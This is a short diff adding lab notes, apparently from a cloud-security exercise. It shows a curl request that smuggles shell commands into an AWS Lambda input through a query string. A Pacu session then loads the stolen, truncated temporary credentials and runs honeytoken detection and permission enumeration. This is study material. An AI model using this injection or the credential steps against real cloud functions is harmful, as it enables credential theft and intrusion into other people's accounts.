@@ -1,0 +1,34 @@
+~~~ Fun with Frameworks ~~~
+
+
+curl https://a8spqqmetd.execute-api.us-east-1.amazonaws.com/prod?inputstring=aaa%3Bexport%3Becho%20bbb
+
+
+cnoio_pacu
+
+
+Pacu (sharedenv001:No Keys Set) > set_keys
+
+Key alias [None]: vulnerable_lambda
+Access key ID [None]: ASIA...
+Secret access key [None]: hJjZ...HxK7
+Session token (Optional - for temp AWS keys only) [None]: FQoG...BQ==
+ 
+Keys saved to database.
+
+
+Pacu (sharedenv001:vulnerable_lambda) > set_regions us-east-1
+  Session regions changed: ['us-east-1']
+
+
+Pacu (sharedenv001:vulnerable_lambda) > whoami
+
+
+Pacu (sharedenv001:vulnerable_lambda) > run iam__detect_honeytokens
+
+
+Pacu (sharedenv001:vulnerable_lambda) > run iam__enum_permissions
+
+
+Pacu (sharedenv001:vulnerable_lambda) > whoami
+
